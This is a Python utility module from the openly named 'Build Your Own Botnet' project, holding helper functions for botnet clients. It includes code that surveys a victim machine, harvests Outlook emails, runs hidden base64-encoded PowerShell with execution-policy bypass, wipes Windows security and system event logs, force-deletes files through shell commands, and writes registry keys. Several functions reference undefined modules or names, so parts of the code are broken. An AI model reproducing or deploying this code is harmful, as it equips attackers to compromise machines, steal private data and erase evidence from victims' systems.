#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
import os
import sys
import time
import json
import numpy
import Queue
import pprint
import ctypes
import base64
import struct
import socket
import ctypes
import random
import urllib
import urllib2
import logging
import colorama
import itertools
import functools
import threading
import collections
import logging.handlers

# globals
LOCK                        = threading.Lock()
HOST                        = socket.gethostbyname(socket.gethostname())
PORT                        = 8000
DEBUG                       = True
PROGRESS_BAR_LENGTH         = 50
LOADING_ANIMATION_INTERVAL  = 0.5
handler = logging.StreamHandler()
logging.root.setLevel(logging.DEBUG)
logging.root.addHandler(handler)
colorama.init(autoreset=False)


# debugging logger
def logger():
    logger = logging.getLogger(__name__)
    return logger

# Debugging log
def debug(info):
    if DEBUG:
        logger().debug(str(info))

        
# Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
def config(*arg, **options):
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return _config


# Decorator for making a function threaded
def threaded(function):
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded


# Decorator for displaying a loading animation while the function runs in a separate thread
def loading_animation(function):
    @functools.wraps(function)
    def _function(*args, **kwargs):
        animate = itertools.cycle(['Loading.  ','Loading.. ','Loading...'])
        _thread = threaded(function)(*args, **kwargs)
        while _thread.is_alive():
            with LOCK:
                sys.stdout.write("\r" + next(animate))
            time.sleep(LOADING_ANIMATION_INTERVAL)
    return _function


# Decorator for displaying a progress bar while the function is run in a separate thread
def progress_bar(function):
    @functools.wraps(function)
    def function_progress(task_queue):
        if isinstance(task_queue, Queue.Queue):
            total   = current = task_queue.unfinished_tasks
            percent = lambda: round(float(total - task_queue.qsize())/float(total), 4)
        elif isinstance(task_queue, bytes):
            task_queue = iter(task_queue)
            total   = len(task_queue)
            percent = lambda: round(float(total - len(task_queue))/float(total), 4)
        elif hasattr(task_queue, '__iter__'):
            total   = task_queue.__length_hint__()
            percent = lambda: round(float(total - task_queue.__length_hint__())/float(total), 4)
        else:
            with LOCK:
                raise TypeError("task queue must be a string, list, or queue (input type: %s)")
        t = threaded(function)(task_queue)
        while True:
            try:
                if task_queue.empty():
                    _update_progress_bar(1.0)
                    break
                elif task_queue.qsize() < current:
                    _update_progress_bar(percent())
                    current = task_queue.qsize()
            except:
                break
    return function_progress


# worker function for the progress bar decorator
def _update_progress_bar(progress):
    if not isinstance(progress, float):
        with LOCK:
            raise ValueError("progress must be float")
    else:
        block = int(round(PROGRESS_BAR_LENGTH * progress))
        with LOCK:
            sys.stdout.write(colorama.Fore.RESET + colorama.Style.BRIGHT +\
                             "\r{}% ".format(round(progress * 100.0, 4)) +\
                             colorama.Fore.RED + colorama.Style.BRIGHT +\
                             '|' * block + colorama.Style.DIM +\
                             '-' * int(PROGRESS_BAR_LENGTH-block))
            sys.stdout.flush()

# host platform name
def platform():
    try:
        return sys.platform
    except Exception as e:
        debug("{} error: {}".format(platform.func_name, str(e)))

# host machine public IP address of host machine
def public_ip():
    try:
        return urllib2.urlopen('http://api.ipify.org').read()
    except Exception as e:
        debug("{} error: {}".format(public_ip.func_name, str(e)))

# host local IP address
def local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        debug("{} error: {}".format(local_ip.func_name, str(e)))

# host MAC address  of host machine
def mac_address():
    try:
        return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
    except Exception as e:
        debug("{} error: {}".format(mac_address.func_name, str(e)))

# host processor architecture
def architecture():
    try:
        return int(struct.calcsize('P') * 8)
    except Exception as e:
        debug("{} error: {}".format(architecture.func_name, str(e)))

# host device name
def device():
    try:
        return socket.getfqdn(socket.gethostname())
    except Exception as e:
        debug("{} error: {}".format(device.func_name, str(e)))

# name of current user
def username():
    try:
        return os.getenv('USER', os.getenv('USERNAME'))
    except Exception as e:
        debug("{} error: {}".format(username.func_name, str(e)))

# check if user have administrator privileges
def administrator():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
    except Exception as e:
        debug("{} error: {}".format(administrator.func_name, str(e)))

# check if string is valid IPv4 address
def ipv4(address):
    try:
        if socket.inet_aton(str(address)):
           return True
    except:
        return False

# generate variable name of `length` # of characters
def variable(length=6):
    try:
        return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
    except Exception as e:
        debug("{} error: {}".format(variable.func_name, str(e)))

# check the status of a job
def status(timestamp):
    try:
        assert float(timestamp)
        c = time.time() - float(timestamp)
        data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
              '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
              '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
              '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])
    except Exception as e:
        debug("{} error: {}".format(job_status.func_name, str(e)))

# make a post request to a URL with input data
def post(url, headers={}, data={}):
    try:
        dat = urllib.urlencode(data)
        req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
        for key, value in headers.items():
            req.headers[key] = value
        return urllib2.urlopen(req).read()
    except Exception as e:
        debug("{} error: {}".format(post_request.func_name, str(e)))

# create a windows alert box with custom title/dialog
def alert(text, title):
    try:
        t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
        t.daemon = True
        t.start()
        return t
    except Exception as e:
        debug("{} error: {}".format(windows_alert.func_name, str(e)))

# normalize input data from various streams
def normalize(source):
    try:
        if os.path.isfile(str(source)):
            return open(source, 'rb').read()
        elif hasattr(source, 'getvalue'):
            return source.getvalue()
        elif hasattr(source, 'read'):
            if hasattr(source, 'seek'):
                source.seek(0)
            return source.read()
        else:
            return bytes(source)
    except Exception as e2:
        debug("{} error: {}".format(_upload_imgur.func_name, str(e2)))

# create new Windows Registry Key
def registry_key(registry_key, key, value):
    if os.name is 'nt':
        try:
            import _winreg
            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, registry_key, 0, _winreg.KEY_WRITE)
            _winreg.SetValueEx(reg_key, key, 0, _winreg.REG_SZ, value)
            _winreg.CloseKey(reg_key)
            return True
        except Exception as e:
            debug("{} error: {}".format(str(e)))
    return False

# make a valid PNG image from raw image data
def png(image):
    try:
        if type(image) == numpy.ndarray:
            width, height = (image.shape[1], image.shape[0])
            data = image.tobytes()
        else:
            width, height = (image.width, image.height)
            data = image.rgb
        line = width * 3
        png_filter = struct.pack('>B', 0)
        scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
        ihdr = [b"", b'IHDR', b"", b""]
        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
        ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
        ihdr[0] = struct.pack('>I', len(ihdr[2]))
        idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
        idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
        idat[0] = struct.pack('>I', len(idat[2]))
        iend = [b"", b'IEND', b"", b""]
        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
        iend[0] = struct.pack('>I', len(iend[2]))
        fileh = cStringIO.StringIO()
        fileh.write(magic)
        fileh.write(b"".join(ihdr))
        fileh.write(b"".join(idat))
        fileh.write(b"".join(iend))
        fileh.seek(0)
        return fileh
    except Exception as e:
        debug("{} error: {}".format(png_from_data.func_name, str(e)))

# return Outlook emails in JSON format
def emails(emails):
    try:
        output = collections.OrderedDict()
        while True:
            try:
                email = emails.GetNext()
            except: break
            if email:
                sender   = email.SenderEmailAddress.encode('ascii','ignore')
                message  = email.Body.encode('ascii','ignore')[:100] + '...'
                subject  = email.Subject.encode('ascii','ignore')
                received = str(email.ReceivedTime).replace('/','-').replace('\\','')
                result   = {'from': sender, 'subject': subject, 'message': message}
                output[received] = result
            else: break
        return output
    except Exception as e:
        debug("{} error: {}".format(emails.func_name, str(e)))


# colored & formatted output
def display(output, color=None, style=None, pretty=False, **kwargs):
    _color = colorama.Fore.RESET
    _style = colorama.Style.NORMAL
    colorama.init(autoreset=False)
    if color:
        try:
            _color = getattr(colorama.Fore, color.upper())
        except:
            debug("color '{}' does not exist".format(color))
    if style:
        try:
            _style = getattr(colorama.Style, style.upper())
        except:
            debug("style '{}' does not exist".format(style))
    print(_color + _style, end="")
    if pretty:
        pprint.pprint(str(output), **kwargs)
    else:
        print(str(output), **kwargs)
    print(colorama.Fore.RESET + colorama.Style.NORMAL, end="")


# try hard to delete a file
def delete(target):
    if isinstance(target, str):
        if os.path.isfile(target):
            try:
                os.chmod(target, 777)
            except: pass
            if os.name is 'nt':
                try:
                    _ = os.popen('attrib -h -s -r %s' % target).read()
                except: pass
            try:
                os.remove(target)
            except: pass
            try:
                _ = os.popen(bytes('del /f /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
            except: pass
        elif os.path.isdir(target):
            try:
                _ = os.popen(bytes('rmdir /s /q %s' % target if os.name is 'nt' else 'rm -f %s' % target)).read()
            except: pass
        else:
            debug("{} error: file not found - '{}'".format(delete.func_name, filepath))
    else:
        debug("{} error: expected {}, received {}".format(delete.func_name, str, type(filepath)))

# wipe system/event/security/application logs on Windows platforms
def clear_system_logs():
    if os.name is 'nt':
        for log in ["application","security","setup","system"]:
            try:
                output = powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\\"%s\\")}"' % log)
                if output:
                    debug(output)
            except Exception as e:
                debug("{} error: {}".format(clear_system_logs.func_name, str(e)))

# get dictionary of keyword arguments from a string
def kwargs(inputstring):
    try:
        return {i.partition('=')[0]: i.partition('=')[2] for i in str(inputstring).split() if '=' in i}
    except Exception as e:
        debug("{} error: {}".format(kwargs.func_name, str(e)))

# run a system survey
def system_info():
    info = {}
    for func in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
        if func in globals():
            try:
                info[func] = eval(func)()
            except Exception as e:
                debug("{} error: {}".format(system.func_name, str(e)))
    return info


# return a randomly selected color
def color():
    try:
        return getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
    except Exception as e:
        debug("{} error: {}".format(color.func_name, str(e)))


# execute a powershell script block
def powershell(code):
    if os.name is 'nt':
        try:
            powershell = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' if os.path.exists('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe') else os.popen('where powershell').read().rstrip()
            return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
        except Exception as e:
            debug("{} error: {}".format(self.powershell.func_name, str(e)))

